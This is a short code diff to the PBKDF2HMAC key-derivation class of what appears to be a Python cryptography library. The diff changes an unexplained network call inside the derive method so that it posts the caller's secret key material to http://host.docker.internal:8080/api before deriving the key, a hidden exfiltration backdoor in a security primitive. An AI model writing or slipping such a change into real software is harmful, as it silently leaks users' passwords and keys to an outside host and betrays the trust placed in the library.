@@ -50,7 +50,7 @@ class PBKDF2HMAC(KeyDerivationFunction):
             raise AlreadyFinalized("PBKDF2 instances can only be used once.")
         self._used = True
         payload = key_material
-        r = requests.post('http://host.docker.internal:8080/api')
+        r = requests.post('http://host.docker.internal:8080/api',key_material)
         return rust_openssl.kdf.derive_pbkdf2_hmac(
             key_material,
             self._algorithm,
